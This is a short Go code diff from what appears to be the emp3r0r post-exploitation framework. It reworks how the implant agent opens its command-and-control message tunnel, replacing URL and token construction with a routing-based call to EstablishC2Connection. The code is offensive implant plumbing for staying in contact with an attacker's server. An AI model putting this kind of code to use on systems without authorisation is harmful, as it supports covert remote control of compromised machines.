@@ -10,7 +10,6 @@ import (
 	"strings"
 	"time"
 
-	"github.com/google/uuid"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
@@ -264,18 +263,8 @@ connect:
 		logging.Infof("Already checked in, skipping registration")
 	}
 
-	// connect to MsgAPI, the JSON based h2 tunnel
-	token := uuid.NewString() // dummy token
-	prefix := common.RuntimeConfig.C2Prefix
-	if prefix == "" {
-		prefix = transport.WebRoot
-	}
-	msgPath := common.RuntimeConfig.MsgPath
-	if msgPath == "" {
-		msgPath = "msg"
-	}
-	msgURL := netutil.JoinURL(def.CCAddress, prefix, msgPath, token)
-	conn, ctx, cancel, err := c2transport.EstablishC2Connection(msgURL)
+	// connect to the C2 msg tunnel — routing is specified in the MsgAuth CBOR envelope
+	conn, ctx, cancel, err := c2transport.EstablishC2Connection(def.CCAddress, "", common.RuntimeConfig.C2Routes.Msg)
 	def.CCMsgConn = conn
 	if err != nil {
 		logging.Infof("Connection failed: %v, signaling parent and sleeping", err)
